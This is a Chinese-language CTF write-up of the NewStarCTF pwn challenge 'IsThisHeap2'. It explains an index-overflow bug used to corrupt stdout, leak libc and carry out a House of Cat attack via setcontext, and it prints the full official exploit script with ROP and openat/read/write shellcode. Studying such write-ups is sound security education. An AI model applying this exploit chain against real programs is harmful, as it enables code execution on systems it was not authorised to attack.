---
title: IsThisHeap2
date: 2023-01-02 21:54:26
categories: 
- pwn_wp
tags: 
- pwn
- IO_FILE
- index overflow

---

NewStarCTF，看起来是堆题实际上是对IO_FILE的利用。
<!-- more -->

查壳，啥都开了，就像真的堆题一样

```sh
[*] '/home/alphonse/CTF_GAME/new_star/isThisHeap2/pwn'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

而且还开了沙箱

```sh
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0a 0xc000003e  if (A != ARCH_X86_64) goto 0012
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x08 0x00 0x40000000  if (A >= 0x40000000) goto 0012
 0004: 0x15 0x07 0x00 0x00000002  if (A == open) goto 0012
 0005: 0x15 0x06 0x00 0x0000009d  if (A == prctl) goto 0012
 0006: 0x15 0x05 0x00 0x00000039  if (A == fork) goto 0012
 0007: 0x15 0x04 0x00 0x0000003a  if (A == vfork) goto 0012
 0008: 0x15 0x03 0x00 0x0000003b  if (A == execve) goto 0012
 0009: 0x15 0x02 0x00 0x00000065  if (A == ptrace) goto 0012
 0010: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0012
 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0012: 0x06 0x00 0x00 0x00000000  return KILL
```

其中ban掉open、execve是比较麻烦的。

程序有个菜单，有add、delete、edit、show、exit五个功能，但实际上delete和show都没有实现。

在add中最多可以同时存在16个chunk，malloc长度固定为0x200。

在edit中同样存在下标越界漏洞，没有检查idx是否<0，会从heaps+idx*0x8的位置取出一个指针，并向指针指向的位置写入0x200字节的内容。heaps在0x202060，而在0x202008处有一个**dso_handle指向自己，可以修改dso_handle获得一个任意写，偏移为-11**。

然而这里因为开了RELRO，应该是写不了GOT表了，并且由于没有了show，要leak libc也没那么容易了。

**不过stdin、stdout、stderr的指针就在heaps前面，这里可以直接通过edit取出他们的指针并对他们进行修改。**

stdout、stdin、stderr的偏移是-8、-6、-4。

这题是对IO_FILE的利用，可以通过edit的漏洞直接对stdin、stdout、stderr进行操作，可以影响文件流的操作。

泄露libc可以通过修改stdout的`_flag`字段和`_IO_write_base`字段进行泄露。puts函数最后对调用到stdout的vtable的`_xsputn()`，通过IO_FILE中的指针指定输出内容的位置。修改对应指针内容就可以改变输出的位置，从而泄露信息，之后debug调一下就能找到libc中地址的位置，从而泄露出libc。

```py
payload=p64(0xfbad1800) + p64(0)*3 + '\x00' 
# flag + _IO_read_ptr + _IO_read_end + _IO_read_base + _IO_write_base(只改了低字节)
```

后面get shell就有些麻烦了，官方的WP是走的House of apple2或House of cat打puts劫持程序流，之后用mprotect分配可读可写可执行的空间之后写shellcode走orw（open被ban了只能走openat）。

看网上有走rop的orw（open被ban了只能走openat），通过修改stdin劫持scanf将rop链写到main的返回地址，并在写完后再写一次将scanf的返回地址覆盖为`leave;ret;`跳出到main结束，最后main返回调用rop链。

先按照官方的WP走，House of apple2和House of cat都是对**_IO_wfile_jumps**中的函数进行攻击，官方的wp走的好像是`House of Cat`。

首先利用`stdout`泄露`libc`，之后便修改`stdout`走`House of Cat`，伪造`vtable`时修改为`_IO_wfile_jumps`，并通过偏移将`xsputn`修改为`seekoff`，伪造`wide_data->vtable`时将`_IO_WOVERFLOW`修改为`set_context+61`，后面调用`puts`就会一路走到`set_context+61`，设置各个寄存器，劫持rip执行read输入数据，同时也要劫持rsp和read的地址使得输入的数据能够栈溢出，之后通过栈溢出走rop链调用`mprotect`修改写入数据位置为`rwx`，之后调用写入的`shellcode`执行`orw`。

官方wp：

```py
#!/usr/bin/env python2
# -*- coding: utf-8 -*
from pwn import *

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))


elf = ELF('./pwn')
context(arch = elf.arch, os = 'linux',log_level = 'debug')
# p = process('./pwn')
p = remote("node4.buuoj.cn",28657)

def edit(idx,data):
    sla(">> ",str(3))
    sla("Index",str(idx))
    sea("Content",str(data))

edit(-8,p64(0xfbad1800)+p64(0)*3+'\x00')
libc_leak = uu64(ru('\x7f',drop=False)[-6:])
libc_base = libc_leak - 0x1ec980

libc = ELF('./libc-2.31.so')
libc.address = libc_base
system_addr = libc.sym.system
bin_sh = libc.search('/bin/sh').next()
magic = libc.sym.setcontext + 61

rdx = 0x0000000000142c92 + libc_base
rdi = 0x0000000000023b6a + libc_base
rsi = 0x000000000002601f + libc_base

_IO_wfile_jumps = libc_base + 0x1e8f60
target = libc_base + 0x1ed6a0 # _IO_2_1_stdout_
addr = target&(~0xfff)
fuck_frame = SigreturnFrame()
fuck_frame.rdi = 0
fuck_frame.rsi = addr
fuck_frame.rdx = 0x300
fuck_frame.rsp = addr
fuck_frame.rip = libc.sym.read
fuck_io = p64(0)*5 + p64(1) + p64((((((target+0x100)>>32)-1))<<32)+((target+0x100)&0xffffffff)) + p64(3) + p64(4)
# p64(1)后的那个地址指向fuck_frame，后面set_context会将这个地址设置为rdx，并以其为基准将fuck_frame的值赋给寄存器
fuck_io = fuck_io.ljust(0x88,'\0')
fuck_io += p64(target+0x30)
fuck_io = fuck_io.ljust(0xa0,'\0')
fuck_io += p64(target+0x10)   # wide_data
fuck_io = fuck_io.ljust(0xd8,'\0')
fuck_io += p64(_IO_wfile_jumps + 0x10) # vtable 通过偏移将xsputn改为seekoff
fuck_io += p64(0) + p64(magic) + p64(target+0xe8-0x18) + p64(0) # magic覆盖了wide_data的vtable中的_IO_WOVERFLOW
fuck_io += str(fuck_frame)

edit(-8,fuck_io)

sleep(0.1)
se(p64(rdi)+p64(addr)+p64(rsi)+p64(0x1000)+p64(rdx)+p64(7)+p64(libc.sym.mprotect)+p64(addr+0x40)+asm('lea rbp,[rsp+0x200];'+shellcraft.openat(0,"/flag",0)+shellcraft.read('rax','rbp',0x100)+shellcraft.write(1,'rbp',0x100)+shellcraft.exit(0)))

p.interactive()
```







